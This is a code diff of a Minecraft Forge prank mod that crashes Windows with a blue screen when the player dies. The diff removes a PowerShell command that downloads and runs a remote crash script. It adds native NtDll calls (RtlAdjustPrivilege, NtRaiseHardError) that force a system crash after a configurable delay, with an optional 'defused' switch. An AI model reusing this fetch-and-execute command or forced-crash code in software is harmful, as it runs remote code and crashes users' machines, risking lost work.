@@ -1,6 +1,6 @@
 package com.cosmiiko.bsodod;
 
-
+import com.sun.jna.Memory;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.entity.player.ClientPlayerEntity;
 import net.minecraftforge.api.distmarker.Dist;
@@ -8,25 +8,30 @@ import net.minecraftforge.api.distmarker.OnlyIn;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.event.TickEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
+import net.minecraftforge.fml.ModLoadingContext;
 import net.minecraftforge.fml.common.Mod;
+import net.minecraftforge.fml.config.ModConfig;
 import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
 import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import java.io.File;
 import java.io.IOException;
-import java.util.UUID;
 
 @Mod("bsodod")
 public class BSODOnDeath
 {
     private static final Logger LOGGER = LogManager.getLogger();
     private boolean hasDied = false;
+    private boolean timerStarted = false;
 
     public BSODOnDeath() {
         FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
 
         MinecraftForge.EVENT_BUS.register(this);
+
+        ModLoadingContext.get().registerConfig(ModConfig.Type.CLIENT, Config.CLIENT_SPEC);
     }
 
     private void setup(final FMLCommonSetupEvent event)
@@ -52,7 +57,13 @@ public class BSODOnDeath
 
         // Player has respawned
         if (ply.getHealth() > 0.0F && hasDied)
+        {
             hasDied = false;
+
+            // Start the timer of the blue screen
+            timerStarted = true;
+        }
+
 
         if (ply.getHealth() == 0.0F && !hasDied)
         {
@@ -74,22 +85,48 @@ public class BSODOnDeath
                 // Desktop doesn't work, throws a HeadlessException for some reason
                 // See https://stackoverflow.com/questions/5226212/how-to-open-the-default-webbrowser-using-java for this hack
 
-                String url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler " + url);
+                Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler " + Config.openUrl);
             }
             catch (IOException e)
             {
                 LOGGER.error("Error during Rick Roll attempt: ", e);
             }
+        }
+    }
 
-            try {
-                // Runs this (https://github.com/peewpw/Invoke-BSOD) BSOD powershell script by peewpw
-                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
-            }
-            catch (IOException e)
+    private int tickCounter = 0;
+
+    @SubscribeEvent
+    public void onClientTickEvent(TickEvent.ClientTickEvent event)
+    {
+        if (timerStarted)
+        {
+            if (tickCounter % 40 == 0)
             {
-                LOGGER.error("Error during BSOD attempt: ", e);
+                LOGGER.info("BSOD in " + (Config.delayInSecs - tickCounter/40) + " secs");
             }
+
+            if (tickCounter == Config.delayInSecs*40)
+            {
+                // Enable the shutdown privilege
+                NtDll.INSTANCE.RtlAdjustPrivilege(19, true, false, new Memory(1));
+
+                if (Config.defused)
+                {
+                    LOGGER.info("You would have gotten a blue screen here but the mod is defused.");
+                }
+                else
+                {
+                    // Raise an error and shutdown because of it
+                    NtDll.INSTANCE.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, new Memory(32));
+                }
+
+                timerStarted = false;
+                tickCounter = 0;
+                return;
+            }
+
+            tickCounter++;
         }
     }
 }
